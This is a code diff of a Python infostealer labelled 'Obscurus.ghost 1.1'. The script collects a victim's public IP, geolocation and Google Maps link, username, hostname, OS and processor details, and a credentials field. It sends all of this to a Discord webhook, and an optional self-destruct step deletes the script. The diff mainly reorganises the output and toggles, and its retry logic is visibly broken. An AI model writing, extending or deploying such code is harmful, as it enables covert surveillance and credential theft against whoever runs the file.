@@ -12,13 +12,14 @@ from datetime import date
 
 #customization of behavior
 ip_log = True
+location_log = True
 general_log = True
 self_destruct = False
-retry_request =  True
+retry_request =  False
 
 #FINISHED
 #log location and other info
-if ip_log == True:
+if location_log == True:
     req = requests.get("https://ipinfo.io/json")
     data = req.json()
     ip = data.get('ip')
@@ -28,14 +29,21 @@ if ip_log == True:
     org = data.get('org')
     loc = data.get('loc')
     googlemap = "https://www.google.com/maps/search/google+map++" + loc
+    location_info = (f""" 
+
+    [-] City - {city}
+    
+    [-] Country - {country}
+
+    [-] Region - {region}
+
+    [-] Org - {org}
+
+    [-] Loc - {loc}
+
+    [-] Google - {googlemap}""")
 else:
-    ip = ("Set: False")
-    city = ("Set: False")
-    country = ("Set: False")
-    region = ("Set: False")
-    org = ("Set: False")
-    loc = ("Set: False")
-    googlemap = ("Set: False")
+    location_info = ("Location info us turned OFF")
 
 #FINISHED, maybe add more stuff later
 #general info
@@ -52,20 +60,41 @@ if general_log == True:
     computername = socket.gethostname()
     localipaddress = socket.gethostbyname(computername)
     date_of_extraction = date.today()
-else:
-    machine1 = ("set: False")
-    version1 = ("set: False")
-    platform1 = ("set: False")
-    uname1 = ("set: False")
-    network_name = ("set: False")
-    python = ("set: False")
-    system1 = ("set: False")
-    process1 = ("set: False")
-    computername = ("set: False")
-    localipaddress = ("set: False")
-    date_of_extraction = ("set: False")
-    pass
+    general_info = (f""" 
 
+    [-] Machine - {machine1}
+                     
+    [-] Version - {version1}
+
+    [-] Platform - {platform1}
+
+    [-] UserName - {uname1}
+
+    [-] NetName - {network_name}
+
+    [-] Python - {python}
+
+    [-] System - {system1}
+
+    [-] Processor - {process1}
+
+    [-] PCname - {computername}
+
+    [-] Date - {date_of_extraction}""")
+else:
+    general_info = ("Logging of general informations is turned OFF")
+
+#FINISHED
+#ip log
+if ip_log == True:
+    ip_info = (f"""
+    [-] IP - {ip}
+
+    [-] Local IP - {localipaddress}
+
+    """)
+else:
+    ip_info = ("IP info is turned OFF")
 
 #extract browser creds
 #finish later
@@ -86,7 +115,7 @@ else:
 #FINISHED
 #the discord part
 
-url='URL HERE'
+url='WEBHOOK_URL'
 
 data_to_discord = {
 }
@@ -97,21 +126,13 @@ data_to_discord["embeds"] = [
                     'author': {
                         'name': f'Obscurus.ghost 1.1 \\ {date_of_extraction}'
                     },
-                    'description': f' @everyone Instance of Obscurus.ghost was ran, extracted data:',
+                    'description': f'''Instance of Obscurus.ghost was ran, extracted data:''',
                     'fields': [
                         {
                             'name': 'PC informations ',
                             'value': f'''
 
-                            Version - {version1}
-                            Platform - {platform1}
-                            Username - {uname1}
-                            Process- {process1}
-                            Machine - {machine1}
-                            ComputerName - {computername}
-                            ExitNode = {network_name}
-                            Python = {python}
-                            OS - {system1}
+                            {general_info}
                             
                             '''
                         },
@@ -119,8 +140,7 @@ data_to_discord["embeds"] = [
                             'name': 'Network informations ',
                             'value': f'''
 
-                            IP - {ip}
-                            Local - {localipaddress}
+                            {ip_info}
                             
 
                             '''
@@ -129,19 +149,15 @@ data_to_discord["embeds"] = [
                             'name': 'Location ',
                             'value': f'''
 
-                            City - {city}
-                            Country - {country}
-                            Region - {region}
-                            Org- {org}
-                            Location - {loc}
-                            {googlemap}
+                            {location_info}
+
                             ''',
                         },
                         {  #i need to add some sort of function to ignore wifi variable when on linux, but i am too dumb to do that :D
                             'name': "Credentials",
                             'value':f''' 
                             {b}
-
+                           
                             ''',
                         }
                     ],
@@ -155,7 +171,7 @@ result = requests.post(url, json = data_to_discord)
 
 if retry_request == True:
     request_for_retry = (requests.post(url, json = data_to_discord))
-    if result.status_code ==200:
+    if result.status_code !=200:
         for x in request_for_retry:
             request_for_retry 
     else:
@@ -171,8 +187,3 @@ if self_destruct == True:
     os.remove(path + '/' + filename)
 else: 
     pass
-
-
-
-    
-
